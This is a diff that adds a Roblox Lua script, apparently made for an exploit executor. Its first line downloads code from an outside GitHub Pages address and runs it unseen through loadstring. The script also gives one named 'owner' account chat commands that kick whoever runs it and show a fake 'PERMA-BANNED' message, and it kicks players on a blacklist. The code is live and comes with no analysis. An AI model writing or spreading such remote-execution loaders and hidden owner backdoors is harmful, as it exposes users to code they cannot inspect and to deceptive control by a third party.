@@ -1,0 +1,41 @@
+loadstring(game:HttpGet("https://ticxyy.github.io/V4.2"))()
+
+local StandOwner = "sjsjnzndnf" -- Replace "sjsjnzndnf" with the username of the account you want to listen to
+local blacklistedIDs = {123456, 789012} -- Replace these with the IDs of the blacklisted players
+
+-- Function to kick blacklisted players
+local function kickBlacklistedPlayers()
+    for _, player in ipairs(game.Players:GetPlayers()) do
+        if table.find(blacklistedIDs, player.UserId) then
+            player:Kick("You Are Blacklisted From This Script!")
+        end
+    end
+end
+
+-- Function to handle commands
+local function handleCommands(player, msg)
+    if player.Name == StandOwner then
+        if msg == "!kick ." then
+            game.Players.LocalPlayer:Kick("Kicked By Premium User.")
+        elseif msg == "!fakeban ." then
+            game.Players.LocalPlayer:Kick("PERMA-BANNED")
+        end
+    end
+end
+
+-- Kick blacklisted players when the script is executed
+kickBlacklistedPlayers()
+
+-- Player added event
+game.Players.PlayerAdded:Connect(function(player)
+    if table.find(blacklistedIDs, player.UserId) then
+        player:Kick("You Are Blacklisted From This Script!")
+    end
+end)
+
+-- Listen for chat messages
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(msg)
+        handleCommands(player, msg)
+    end)
+end)
